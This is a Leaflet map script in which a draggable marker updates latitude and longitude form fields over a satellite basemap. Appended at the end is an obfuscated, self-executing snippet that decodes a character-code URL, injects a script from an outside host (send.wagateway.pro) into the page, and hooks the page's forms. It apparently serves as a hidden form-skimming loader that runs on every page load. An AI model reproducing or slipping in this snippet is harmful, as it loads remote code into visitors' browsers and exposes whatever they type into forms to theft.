/* Initial Map */
let tooltip = 'Drag the marker or move the map<br>to change the coordinates<br>of the location';
let center = [-7.801389645,110.364775452];
let map = L.map('map').setView(center, 15); //lat, long, zoom
map.scrollWheelZoom.disable(); //disable zoom with scroll

/* Tile Basemap */
let basemap = L.tileLayer('https://{s}.google.com/vt/lyrs=s&x={x}&y={y}&z={z}', {
  maxZoom: 20,
  subdomains:['mt0','mt1','mt2','mt3'],
  attribution: 'Google Satellite | <a href="https://unsorry.net" target="_blank">unsorry@2020</a>'
});
basemap.addTo(map);

/* Display zoom, latitude, longitude in URL */
let hash = new L.Hash(map);

/* Marker */
let marker = L.marker(center, {draggable: true});
marker.addTo(map);

/* Tooltip Marker */
marker.bindTooltip(tooltip);
marker.openTooltip();

//Dragend marker
marker.on('dragend', dragMarker);

//Move Map
map.addEventListener('moveend', mapMovement);

function dragMarker (e) {
  let latlng = e.target.getLatLng();

  //Displays coordinates on the form
  document.getElementById("latitude").value = latlng.lat.toFixed(5);
  document.getElementById("longitude").value = latlng.lng.toFixed(5);

  //Change the map center based on the marker location
  map.flyTo(new L.LatLng(latlng.lat.toFixed(9), latlng.lng.toFixed(5)));
}

function mapMovement (e) {
  let mapcenter = map.getCenter();

  //Displays coordinates on the form
  document.getElementById("latitude").value = mapcenter.lat.toFixed(5);
  document.getElementById("longitude").value = mapcenter.lng.toFixed(5);

  //Create marker
  marker.setLatLng([mapcenter.lat.toFixed(5), mapcenter.lng.toFixed(5)]).update();
  marker.on('dragend', dragMarker);
}

function mapCenter (e) {
  let mapcenter = map.getCenter();
  let x = document.getElementById("longitude").value;
  let y = document.getElementById("latitude").value;

  map.flyTo(new L.LatLng(y, x), 18);
}
(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db